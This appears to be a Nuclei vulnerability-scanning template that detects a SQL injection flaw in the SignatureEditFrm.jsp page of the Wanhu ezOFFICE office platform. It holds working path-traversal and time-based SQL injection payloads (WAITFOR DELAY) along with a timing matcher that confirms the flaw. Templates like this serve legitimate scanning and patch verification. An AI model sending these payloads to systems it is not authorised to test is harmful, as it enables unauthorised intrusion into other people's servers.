id: wanhuoa-SignatureID-sqli

info:
  name: Template Name
  author: wangzong
  severity: high
  description: 万户ezOFFICE协同管理平台是一个综合信息基础应用平台。 万户协同办公平台SignatureEditFrm.jsp存在SQL注入漏洞
  reference:
    - https://github.com/wy876/POC/commit/e9ebc9ab7da2132f9afa9e813bfa98b15375ffca#diff-3394466de146386274fa3b5298cd1967a2e4ead17921e14d3e8e70557cc6d401R2
  tags: tags

http:
  - method: GET
    path:
      - "{{BaseURL}}/defaultroot/iWebOfficeSign/OfficeServer.jsp/../../public/iWebRevision.jsp/Signature/SignatureEditFrm.jsp?SignatureID=1;WAITFOR%20DELAY%20%270:0:3%27--"
      - "{{BaseURL}}/defaultroot/iWebOfficeSign/OfficeServer.jsp/../../public/iWebRevision.jsp/Signature/SignatureEditFrm.jsp?SignatureID=1;WAITFOR%20DELAY%20%270:0:6%27--"
      - "{{BaseURL}}/defaultroot/iWebOfficeSign/OfficeServer.jsp/../../public/iWebRevision.jsp/Signature/SignatureEditFrm.jsp?SignatureID=1;WAITFOR%20DELAY%20%270:0:9%27--"

    matchers:
      - type: dsl
        condition: and
        dsl:
          - "duration_1>=3  && duration_1<=6"
          - "duration_2>=6  && duration_2<=9"
          - "duration_3>=9  && duration_3<=12"


